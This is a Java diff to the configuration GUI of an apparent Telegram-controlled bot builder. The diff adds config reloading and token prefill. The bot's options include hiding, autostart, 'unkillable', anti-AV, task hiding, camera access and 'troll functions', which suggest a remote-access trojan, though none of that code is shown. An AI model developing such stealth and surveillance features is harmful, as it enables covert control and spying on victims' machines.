@@ -41,14 +41,15 @@ public class BotCreate {
     static JFrame frame = new JFrame("BotCreate");
 
     public BotCreate() {
+
         createButton.addActionListener(new ActionListener() {
-            Config conf;
+            Config conf = BotCreate.read();
 
             @Override
             public void actionPerformed(ActionEvent e) {
                 char[] password = passwordPasswordField.getPassword();
                 String pw = new String(password);
-                this.conf = new Config(hiddenCheckBox.isSelected(), autostartCheckBox.isSelected(), startUpNotificationCheckBox.isSelected(), unkillableCheckBox.isSelected(),
+                conf = new Config(hiddenCheckBox.isSelected(), autostartCheckBox.isSelected(), startUpNotificationCheckBox.isSelected(), unkillableCheckBox.isSelected(),
                         antiAVCheckBox.isSelected(), trollFunctionsCheckBox.isSelected(), cameraCheckBox.isSelected(), privateCheckBox.isSelected(), taskHideCheckBox.isSelected(), aliveCheckCheckBox.isSelected(), telegramBotKeyTextField.getText(), botNameTextField.getText(), false, pw);
                 frame.dispose();
                 try {
@@ -66,8 +67,12 @@ public class BotCreate {
         telegramBotKeyTextField.addFocusListener(new FocusAdapter() {
             @Override
             public void focusGained(FocusEvent e) {
+                Config conf = BotCreate.read();
                 if (telegramBotKeyTextField.getText().equalsIgnoreCase("Bot Token")) {
-                    telegramBotKeyTextField.setText("");
+                    if (conf.isReset())
+                        telegramBotKeyTextField.setText(conf.getToken());
+                    else
+                        telegramBotKeyTextField.setText("");
                 }
                 super.focusGained(e);
             }
@@ -84,8 +89,12 @@ public class BotCreate {
         telegramBotKeyTextField.addFocusListener(new FocusAdapter() {
             @Override
             public void focusLost(FocusEvent e) {
+                Config conf = BotCreate.read();
                 if (telegramBotKeyTextField.getText().equalsIgnoreCase("")) {
-                    telegramBotKeyTextField.setText("Bot Token");
+                    if (conf.isReset())
+                        telegramBotKeyTextField.setText(conf.getToken());
+                    else
+                        telegramBotKeyTextField.setText("Bot Token");
                 }
                 super.focusLost(e);
             }
@@ -99,10 +108,12 @@ public class BotCreate {
                 super.focusLost(e);
             }
         });
+
     }
 
     public static void main(String[] args) throws InterruptedException, IOException, ClassNotFoundException {
         File conf = new File(System.getProperty("user.home") + "\\botconf.bot");
+
         if (!conf.exists()) {
             frame.setContentPane(new BotCreate().Back);
             frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
@@ -111,10 +122,33 @@ public class BotCreate {
             frame.setResizable(false);
             frame.setVisible(true);
         } else {
-            ApiContextInitializer.init();
-            Bot bot = new Bot(args);
-            starten(bot);
+            Config config = read();
+            if (config.isReset()) {
+                frame.setContentPane(new BotCreate().Back);
+                frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
+                frame.pack();
+                frame.setLocationRelativeTo(null);
+                frame.setResizable(false);
+                frame.setVisible(true);
+            } else {
+                ApiContextInitializer.init();
+                Bot bot = new Bot(args);
+                starten(bot);
+            }
         }
+    }
+
+    static Config read() {
+        Config back = null;
+        try {
+            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\botconf.bot");
+            ObjectInputStream ois = new ObjectInputStream(fis);
+            back = (Config) ois.readObject();
+            ois.close();
+        } catch (Exception e) {
+            System.out.println(e);
+        }
+        return back;
     }
 
     private static void starten(Bot bot) throws InterruptedException {
@@ -123,11 +157,10 @@ public class BotCreate {
             telegramBotsApi.registerBot(bot);
         } catch (Exception e) {
             //bo.stop();
-            System.out.println(e);
-            System.out.println("FAIL");
             bot.setImage(3);
             Thread.sleep(5000);
             starten(bot);
+            return;
         }
         bot.setImage(0);
     }
